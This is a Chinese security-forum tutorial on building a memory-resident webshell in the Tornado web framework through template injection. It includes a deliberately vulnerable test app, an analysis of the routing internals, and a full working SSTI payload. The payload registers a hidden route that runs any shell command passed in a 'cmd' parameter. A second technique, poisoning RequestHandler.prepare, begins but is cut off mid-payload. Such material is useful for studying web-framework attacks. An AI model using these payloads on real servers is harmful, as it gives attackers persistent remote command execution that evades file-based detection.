---
title: 掌握Tornado隐秘漏洞：构建内存马，实现命令执行
url: https://forum.butian.net/share/4148
source: 奇安信攻防社区
date: 2025-02-19
fetch_date: 2025-10-06T20:36:12.629673
---

# 掌握Tornado隐秘漏洞：构建内存马，实现命令执行

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 掌握Tornado隐秘漏洞：构建内存马，实现命令执行

最近老遇到需要用到 Tornado 知识点的地方，学习一波

框架介绍
====
Tornado是一个使用Python编写的Web框架和异步网络库，最初由FriendFeed开发。它以其非阻塞网络I/O的特性而闻名，并且非常适合于长轮询、WebSocket和其他需要长时间连接的应用场景。Tornado不仅提供了强大的异步处理能力，还内置了一个可扩展的模板引擎。
模板渲染:
=====
Tornado 中模板渲染函数在有两个
- render
- render\\_string
- \*\*`render`\*\*: 该方法通常用于加载一个模板文件，然后将指定的参数传递给这个模板，并最终将渲染后的结果发送给客户端。这是处理Web页面渲染的一个非常直接的方法。
- \*\*`render\_string`\*\*: 这个方法允许你直接从字符串中加载模板内容，而不是从文件系统中读取。它同样接受参数来填充模板中的占位符。与`render`不同的是，`render\_string`返回渲染后的字符串，而不直接输出到HTTP响应中。 如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过{{}}进行传递变量和执行简单的表达式。
基本语法
====
- \*\*`{{ ... }}`\*\*：用于输出Python表达式的结果，默认情况下会进行HTML编码以防止XSS攻击。如果需要输出未经转义的内容，可以使用`{{! ... }}`。
- \*\*`{% ... %}`\*\*：用于执行控制语句，如条件判断、循环等。下面是几种具体的用法：
- \*\*注释 `{# ... #}`\*\*：用于在模板中添加注释，这些注释不会被渲染到最终的HTML中。
- \*\*应用函数 `{% apply \*function\* %}...{% end %}`\*\*：允许你对模板中的部分内容应用一个特定的函数。例如，你可以使用它来进行自定义的文本转换。
- \*\*自动转义 `{% autoescape \*function\* %}`\*\*：设置当前模板文件的默认转义规则。这对于确保输出的安全性非常重要。
- \*\*块定义与引用 `{% block \*name\* %}...{% end %}`\*\*：用于模板继承机制，允许你在父模板中定义可覆盖的区域。子模板可以通过重新定义同名的块来替换或扩展这些区域的内容。
- \*\*引入模板 `{% extends \*filename\* %}`\*\*：指定当前模板是基于另一个模板的扩展。这通常与`block`一起使用来创建可复用的页面布局。
- \*\*循环 `{% for \*var\* in \*expr\* %}...{% end %}`\*\*：支持遍历列表或其他可迭代对象，类似于Python中的`for`循环。
- \*\*条件判断 `{% if \*condition\* %}...{% elif \*condition\* %}...{% else %}...{% end %}`\*\*：根据条件选择性地渲染模板的不同部分，就像Python中的`if`语句一样工作。
- \*\*包含模板 `{% include \*filename\* %}`\*\*：将另一个模板的内容插入当前位置。这对于重用常见的UI组件特别有用。
- \*\*模块化引用 `{% module \*expr\* %}`\*\*：用于调用Tornado的UI模块，这有助于实现更复杂的功能，比如动态表单或交互式部件。
- \*\*原始输出 `{% raw \*expr\* %}`\*\*：直接输出表达式的值而不进行任何转义，应谨慎使用以防XSS风险。
- \*\*变量赋值 `{% set \*x\* = \*y\* %}`\*\*：在模板内部创建局部变量，以便后续使用。
- \*\*异常处理 `{% try %}...{% except %}...{% else %}...{% finally %}...{% end %}`\*\*：提供类似Python的异常处理能力，使模板也能安全地处理潜在错误。
- \*\*空白处理 `{% whitespace \*mode\* %}`\*\*：控制模板处理空白字符的方式，有多种模式可供选择，包括保留所有空白、压缩为单一空格或转换为空行。
内存马构造思路
=======
Web 服务的内存马的构造一般是两个思路：
1. 注册一个新的 url，绑定恶意的函数
2. 修改原有的 url 处理逻辑
测试代码
====
import tornado.ioloop
import tornado.web
​
​
class IndexHandler(tornado.web.RequestHandler):
def get(self):
tornado.web.RequestHandler.\\_template\\_loaders = {}#清空模板引擎
​
with open('index.html', 'w') as (f):
f.write(self.get\\_argument('name'))#GET方式传name参数
self.render('index.html')
​
​
app = tornado.web.Application(
\[('/', IndexHandler)\],
)
app.listen(5000, address="127.0.0.1")
tornado.ioloop.IOLoop.current().start()
对于 Tornado 来说，一旦 `self.render` 之后，就会实例化一个 `tornado.template.Loader`，这个时候再去修改文件内容，它也不会再实例化一次。所以这里需要把 `tornado.web.RequestHandler.\_template\_loaders` 清空。否则在利用的时候，会一直用的第一个传入的 payload。
路由规则分析
======
跟进Application
![](https://cdn.nlark.com/yuque/0/2025/png/44876878/1737621751580-7a202892-bb97-4b27-83a9-234fdef79958.png)
再往下看，发现存在一个类似于 `flask` 中 `add\_url\_rule` 的函数 `add\_handlers`， 会将指定的路由加入当前的路由表中 ， 这意味着，如果我们能够控制输入并触发该方法，就可以在运行时向应用中加入新的处理程序。
def add\\_handlers(self, host\\_pattern: str, host\\_handlers: \\_RuleList) -&gt; None:
"""Appends the given handlers to our handler list.
​
Host patterns are processed sequentially in the order they were
added. All matching patterns will be considered.
"""
host\\_matcher = HostMatches(host\\_pattern)
rule = Rule(host\\_matcher, \\_ApplicationRouter(self, host\\_handlers))
​
self.default\\_router.rules.insert(-1, rule)
​
if self.default\\_host is not None:
self.wildcard\\_router.add\\_rules(
\[(DefaultHostMatches(self, host\\_matcher.host\\_pattern), host\\_handlers)\] )
def add\\_rules(self, rules: \\_RuleList) -&gt; None:
"""Appends new rules to the router.
​
:arg rules: a list of Rule instances (or tuples of arguments, which are
passed to Rule constructor).
"""
for rule in rules:
if isinstance(rule, (tuple, list)):
assert len(rule) in (2, 3, 4)
if isinstance(rule\[0\], basestring\\_type):
rule = Rule(PathMatches(rule\[0\]), \\*rule\[1:\])
else:
rule = Rule(\\*rule)
​
self.rules.append(self.process\\_rule(rule))
新增注册路由
======
参数构造
----
`add\_handlers` 这个函数声明接受两个参数 `host\_pattern` 和 `host\_handlers`，其中 `host\_pattern` 是一个字符串没有什么需要多考虑的，这个场景下直接构造 `.\*` 匹配所有域名即可，而第二个参数 `host\_handlers` 较为复杂一点，类型为 `\_RuleList`，跟进一下`\_RuleList`
\\_RuleList = List\[
Union\[
"Rule",
List\[Any\], # Can't do detailed typechecking of lists.
Tuple\[Union\[str, "Matcher"\], Any\],
Tuple\[Union\[str, "Matcher"\], Any, Dict\[str, Any\]\],
Tuple\[Union\[str, "Matcher"\], Any, Dict\[str, Any\], str\],
\]
\]
再往下看`add\_rules` 函数
def add\\_rules(self, rules: \\_RuleList) -&gt; None:
"""Appends new rules to the router.
​
:arg rules: a list of Rule instances (or tuples of arguments, which are
passed to Rule constructor).
"""
for rule in rules:
if isinstance(rule, (tuple, list)):
assert len(rule) in (2, 3, 4)
if isinstance(rule\[0\], basestring\\_type):
rule = Rule(PathMatches(rule\[0\]), \\*rule\[1:\])
else:
rule = Rule(\\*rule)
​
self.rules.append(self.process\\_rule(rule))
在 `add\_rules` 中，整个传入的值都会被作为构造参数来实例化一个 `Rule` 对象，构造函数如下：
def \\_\\_init\\_\\_(
self,
matcher: "Matcher",
target: Any,
target\\_kwargs: Optional\[Dict\[str, Any\]\] = None,
name: Optional\[str\] = None,
) -&gt; None:
![](https://cdn.nlark.com/yuque/0/2025/png/44876878/1737623868694-8ff7824e-f858-40cc-9523-f1a77ca05dc2.png)
`add\_rules`方法用于向路由器添加新的规则。每个规则通常由一个匹配器（`Matcher`）和一个目标处理器（`target`）组成，其中匹配器决定了哪些请求应该被该规则处理，而目标处理器则是实际处理这些请求的对象。对于`add\_rules`方法而言，它接受一系列规则作为参数，这些规则可以是预先构建好的`Rule`对象，也可以是能够用来构造`Rule`对象的元组或列表
当传入给`add\_rules`的是一个元组或列表，并且其第一个元素为字符串时，Tornado会自动调用`PathMatches`类来生成一个匹配器对象。这简化了我们的任务，因为我们不需要手动实例化复杂的匹配器对象，只需要提供一个简单的路径模式字符串即可。例如：
rule = ('/path/to/match', handler\\_class)
这里的`'/path/to/match'`将被转换成一个`PathMatches`对象，用于匹配特定的URL路径；而`handler\_class`则是负责处理匹配到的请求的类。
为了实现内存马，我们需要创建一个新的`RequestHandler`子类，这个子类能够在接收到HTTP请求时执行某些恶意代码。由于Python支持运行时动态创建类的能力，我们可以使用内置的`type()`函数来完成这项工作。具体来说，`type()`函数允许我们通过指定类名、基类以及类属性/方法字典来创建一个新的类型。在这个例子中，我们将创建一个名为x的新类，它继承自`tornado.web.RequestHandler`，并且重写了`get`方法，以便它可以接收命令行指令并执行它们。
type(
"x",
(\\_\\_import\\_\\_("tornado").web.RequestHandler,),
{
"get": lambda x: x.write(\\_\\_import\\_\\_('os').popen(x.get\\_argument('cmd')).read())
}
)
- `"x"` 是新类的名字。
- `(\_\_import\_\_("tornado").web.RequestHandler,)` 指定了新类将继承自`tornado.web.RequestHandler`。
- `{ "get": ... }` 定义了新类的一个属性——`get`方法，这是一个匿名函数（lambda），它会在接收到POST请求时被执行。这个匿名函数从请求参数中提取名为`"cmd"`的内容， 并通过`\_\_import\_\_('os').popen(...)`执行这段命令，最后将结果转换成字符串形式返回给客户端。
最终的内存马
------
我们将前面提到的所有元素组合在一起，构成了完整的Payload：
{{handler.application.add\\_handlers(".\\*",\[("/4",type("x",(\\_\\_import\\_\\_("tornado").web.RequestHandler,),{"get":lambda x: x.write(\\_\\_import\\_\\_('os').popen(x.get\\_argument('cmd')).read())}))\])}}
![](https://cdn.nlark.com/yuque/0/2025/png/44876878/1737627907450-02646ac7-6986-4ae9-b1b4-b71001a1e036.png)
成功 执行任意系统命令。
覆盖处理函数
======
对于 Tornado 来说，每次请求都是一个全新的 handler 和 request，所以这种直接给 handler 绑定恶意函数的利用方式是不行的
### 理解 `handler` 和 `RequestHandler`
首先，理解`handler`是`RequestHandler`的一个实例非常重要。每次HTTP请求到来时，Tornado都会为该请求创建一个新的`RequestHandler`实例
这意味着任何直接绑定到单个`handler`实例上的恶意函数，在该请求结束后就会失效，因为`handler`实例会被销毁。因此，我们需要找到一种方法，使得即使在请求结束后，也能持续生效。
### 修改类级别行为
既然实例级别的修改无法持久化，我们可以考虑修改类本身的行为。这样做可以让所有新创建的`RequestHandler`实例都继承这些变化，从而实现“源头投毒”。具体来说，就是改变`RequestHandler`类的方法，比如`prepare()`，这是一个在每个请求开始前都会被调用的方法
构造内存马
-----
我们需要确保lambda表达式能够正确接收当前活动的`RequestHandler`实例作为参数，并且能够动态地从当前请求中提取参数。
调用`handler.get\_query\_argument("cmd", "id")`获取URL参数`cmd`的值；如果没有提供`cmd`参数，则默认使用`"id"`。
{% raw handler.\\_\\_class\\_\\_.prepa...